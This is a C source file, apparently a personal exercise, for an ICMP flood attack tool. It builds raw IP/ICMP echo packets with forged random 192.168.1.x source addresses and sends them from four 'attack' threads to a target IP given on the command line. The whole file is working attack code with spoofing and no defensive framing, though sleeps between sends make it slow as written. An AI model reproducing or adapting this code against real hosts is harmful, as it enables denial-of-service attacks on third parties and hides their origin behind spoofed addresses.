/*
 * icmp_flood.cpp
 *
 *  Created on: 2016年10月21日
 *      Author: hanlon
 */

#include <unistd.h>
#include <errno.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h> 		// bzero
#include <signal.h>
#include <pthread.h>
#include <stdlib.h>			// void srand(unsigned seed) ; int rand(void);
#include <sys/syscall.h>	// syscall(SYS_gettid)

#include <sys/socket.h>
#include <netinet/in.h>		// 	socket  AF_INET SOCK_RAW  IPPROTO_ICMP
#include <netinet/ip.h>		// 	struct ip
#include <netinet/ip_icmp.h>// 	struct icmp  ICMP_ECHO ICMP_ECHOREPLY
#include <arpa/inet.h>		// 	inet_ntoa(struct in_addr>>字符串) inet_addr(字符串>>长整型)
							//  struct in_addr 是 struct sockaddr_in的成员 sin_addr 类型
							//  struct sockaddr_in 是 struct sockaddr 在以太网的具体实现
#include <netdb.h>			// 	getprotobyname gethostbyname
#include <net/if.h>			//  IFNAMSIZ   struct ifreq
#include <linux/sockios.h>	//  SIOCGIFADDR  /*  Socket configuration controls. */


static int rawsock = 0;					/*发送和接收线程需要的socket描述符*/
static int alive = 0;
static struct sockaddr_in target_addr ;
#define ATTACK_THREAD_COUNT 4
#define ICMP_DATA_LENGTH 64
struct icmp_flood
{
	struct ip ip_header;
	struct icmp icmp_header;
	unsigned char data[ICMP_DATA_LENGTH];
};

static unsigned short icmp_cksum(unsigned char *data,  int len)
{
	int sum=0;
	int odd = len & 0x01;
	while( len & 0xfffe)  {
		sum += *(unsigned short*)data;
		data += 2;
		len -=2;
	}
	if( odd) {
		unsigned short tmp = ((*data)<<8)&0xff00;
		sum += tmp;
	}
	sum = (sum >>16) + (sum & 0xffff);
	sum += (sum >>16) ;
	return ~sum;
}

static void icmp_pack(struct icmp *icmph, int seq,  int length )
{
	unsigned char i = 0;
	/*设置报头*/
	icmph->icmp_type = ICMP_ECHO;
	icmph->icmp_code = 0;
	icmph->icmp_cksum = 0;

	// 对于ICMP洪水攻击 可以不用设置下面的ICMP ECHO字段 直接对唯一的数据ICMP_ECHO(其他都是0)做CRC16就可以
	// icmph->icmp_cksum = htons( ~(ICMP_ECHO<<8) ) ;
	icmph->icmp_seq = htons(seq);
	icmph->icmp_id = htons(  syscall(SYS_gettid) &0xffff );
	for(i = 0; i< length; i++)
		icmph->icmp_data[i] = i;

	icmph->icmp_cksum =  icmp_cksum((unsigned char*)icmph, sizeof(struct icmp) + length) ;
}

static void ip_pack(struct ip * ipheader , struct sockaddr_in src , struct sockaddr_in dest , int total_len )
{
	unsigned char i = 0;
	ipheader->ip_v = 4 ;
	ipheader->ip_hl = 20 /4 ;
	ipheader->ip_tos = 0 ;
	ipheader->ip_len = htons( total_len );
	static unsigned short ip_id = 0 ;
	ipheader->ip_id = htons(ip_id) ; // static 在多线程中 在进程中共享 可能不安全
	ip_id ++ ;
	unsigned short off = IP_DF | (0 & IP_OFFMASK ) ; // do not Fragmant
	ipheader->ip_off = htons (off);
	ipheader->ip_ttl = 64 ;
	ipheader->ip_p = IPPROTO_ICMP;
	ipheader->ip_sum = 0 ;
	ipheader->ip_src = src.sin_addr ;
	ipheader->ip_dst = dest.sin_addr ;

	ipheader->ip_sum = icmp_cksum((unsigned char*)ipheader, 20 );
	// 通过wireshark查看我们发送出去的IP数据报
}

// 产生某个范围内的随机数 [begin,end] 包含begin和end
static inline int random_src_addr(int begin , int end ){
	int gap = end - begin + 1 ;
	srand((unsigned int)time(0));
	return random()%gap + begin ;
}

static void* icmp_send(void *argv)
{
	struct icmp_flood attracker;
	memset(&attracker , 0 , sizeof(struct icmp_flood) );
	int seq = 0 ;
	while(alive)
	{


		struct sockaddr_in random_src  ;
		random_src.sin_addr.s_addr  =  (192&0x000000FF)
						+ ((168 << 8)&0x0000FF00)
						+ ((1 << 16)&0x00FF0000)
						+ ((random_src_addr(1,254) << 24)&0xFF000000) ;
		printf("random src %s [%ld]\n" , inet_ntoa(random_src.sin_addr)  , syscall(SYS_gettid));
		icmp_pack((struct icmp *)&attracker.icmp_header, seq++ , ICMP_DATA_LENGTH );

		#define ICMP_HEAD  4
		#define ICMP_HUN  4
		ip_pack((struct ip*)&attracker.ip_header , random_src , target_addr  ,
					sizeof(struct ip) + ICMP_HEAD + ICMP_HUN + ICMP_DATA_LENGTH   );

		int size = 0;
		size = sendto (rawsock,  &attracker, sizeof(struct ip) + ICMP_HEAD + ICMP_HUN + ICMP_DATA_LENGTH ,  0,
					(struct sockaddr *)&target_addr, sizeof(target_addr) );
		if(size <0){
			perror("sendto error");
			sleep(10);
			continue;
		}
		sleep(5);
	}
	return NULL;
}

static void stop_icmp_flood_sigint(int signo)
{
	alive = 0;
	return;
}



int main(int argc, char *argv[])
{
	struct hostent * host = NULL;
	struct protoent *protocol = NULL;
	int ret = 0 ;


	printf("sizeof(struct ip) = %zd\n" , sizeof(struct ip) );
	printf("sizeof(struct icmp) = %zd\n" , sizeof(struct icmp) );
	printf("sizeof(struct icmp_flood) = %zd\n" , sizeof(struct icmp_flood) );
	struct icmp test ;
	printf("sizeof(struct icmp_hun) = %zd\n" , sizeof(test.icmp_hun) );
	printf("sizeof(struct icmp_hun) = %zd\n" , sizeof(test.icmp_dun) );
	/*
	 * 	sizeof(struct ip) = 20
		sizeof(struct icmp) = 28  // test.icmp_dun.id_ip 为最大 是个struct ip 20 + 8
		sizeof(struct icmp_flood) = 112
		sizeof(struct icmp_hun) = 4
		sizeof(struct icmp_hun) = 20
	 */

	bzero(&target_addr, sizeof(target_addr));
	target_addr.sin_family = AF_INET;
	in_addr_t inaddr = inet_addr(argv[1]); // 输入的目的地址为字符串IP地址
	if(inaddr == INADDR_NONE){
		printf("usage : ./icmp_flood 192.168.1.1\n");
		return -1 ;
	}else{		// 为IP地址字符串
		memcpy((char*)&target_addr.sin_addr, &inaddr, sizeof(inaddr));
	}
	printf("Target>>>(%x.%x.%x.%x)\n",
		(target_addr.sin_addr.s_addr&0x000000FF)>>0,
		(target_addr.sin_addr.s_addr&0x0000FF00)>>8,
		(target_addr.sin_addr.s_addr&0x00FF0000)>>16,
		(target_addr.sin_addr.s_addr&0xFF000000)>>24);

	protocol = getprotobyname("icmp");
	if (protocol == NULL){
		perror("getprotobyname()");
		return -1;
	}else{
		printf("getprotobyname %s %d\n", protocol->p_name, protocol->p_proto);
	}

	rawsock = socket(AF_INET, SOCK_RAW,  protocol->p_proto);
	if(rawsock < 0){
		perror("create socket error");
		return -1;
	}

	int set = 1 ;
	protocol = getprotobyname("ip");
	if (protocol == NULL){
		perror("getprotobyname()");
		return -1;
	}else{
		printf("getprotobyname %s %d\n", protocol->p_name, protocol->p_proto);
	}
	ret = setsockopt(rawsock, protocol->p_proto/*IPPROTO_IP*/, IP_HDRINCL, &set, sizeof(set));
	if( ret < 0 ){
		perror("setsockopt IP_HDRINCL error");
		return -1 ;
	}

	signal(SIGINT, stop_icmp_flood_sigint);
	alive = 1;
	pthread_t attack_thread_group[ATTACK_THREAD_COUNT];
	int err = 0;

	int i = 0 ;
	for( i = 0 ; i < ATTACK_THREAD_COUNT ; i++ ){
		err = pthread_create(&attack_thread_group[i], NULL, icmp_send, NULL);
		if(err < 0){
			attack_thread_group[i] = -1 ;
			printf("pthread_create %d error \n" , i);
		}else{
			printf("pthread_create %d ok \n" , i);
		}
	}

	for( i = 0 ; i < ATTACK_THREAD_COUNT ; i++ ){
		if( attack_thread_group[i] != -1 ){
			err = pthread_join(attack_thread_group[i], NULL);
			if(err < 0){
				printf("pthread_join %d error \n" , i);
			}else{
				printf("pthread_join %d ok\n" , i);
			}
		}
	}
	close(rawsock);

	return 0;
}



